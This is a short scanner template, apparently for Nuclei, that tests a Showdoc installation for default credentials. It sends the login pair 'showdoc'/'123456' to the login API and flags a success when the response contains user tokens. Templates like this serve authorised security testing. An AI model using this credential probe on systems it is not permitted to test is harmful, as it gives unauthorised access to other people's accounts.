id: poc-yaml-showdoc-default-password
info:
  name: Showdoc Default Password Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  tags: access-control
  description: |
    This template checks for the presence of default credentials in Showdoc application.
http:
  - method: POST
    path:
      - "/server/index.php?s=/api/user/login"
    body: "username=showdoc&password=123456"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "uid"
          - "groupid"
          - "user_token"
